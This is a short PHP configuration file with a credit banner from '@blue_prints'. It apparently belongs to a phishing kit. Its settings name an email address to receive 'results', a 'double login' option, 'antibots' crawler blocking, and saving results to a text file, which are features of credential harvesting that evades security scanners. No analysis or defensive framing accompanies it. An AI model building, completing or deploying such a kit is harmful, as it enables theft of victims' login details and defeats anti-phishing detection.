<?php

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//


//important details
$emailzz = ""; //enter your email
$salt = "45dd12"; // File name

//important on/off
$d_log = "on"; // double login
$crawlerdd ="on"; // antibots
$mailpage ="on"; // to turn on/off email page
$newantbot = "on"; // turn off if face issue
$savetxt = "on"; // to  save txt file of result

?>
